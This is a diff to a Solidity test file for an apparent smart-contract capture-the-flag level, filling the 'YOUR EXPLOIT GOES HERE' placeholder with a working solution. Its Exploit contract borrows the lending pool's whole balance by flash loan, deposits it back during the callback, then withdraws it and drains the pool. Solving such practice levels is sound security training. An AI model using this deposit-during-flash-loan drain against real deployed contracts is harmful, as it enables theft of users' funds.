@@ -14,7 +14,9 @@ contract LendingPoolTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        Exploit exploier = new Exploit();
+        exploier.flashLoan(instance);
+        exploier.withdraw(instance);
 
         checkSuccess();
     }
@@ -22,4 +24,21 @@ contract LendingPoolTest is BaseTest {
     function checkSuccess() internal view override {
         assertTrue(address(instance).balance == 0, "Solution is not solving the level");
     }
+}
+
+contract Exploit is IFlashLoanReceiver {
+
+    function flashLoan(LendingPool instance) public {
+        instance.flashLoan(address(instance).balance);
+    }
+
+    function withdraw(LendingPool instance) public {
+        instance.withdraw();
+    }
+    
+    function execute() public payable {
+        LendingPool(msg.sender).deposit{value:msg.value}();
+    }
+
+receive() external payable {}
 }
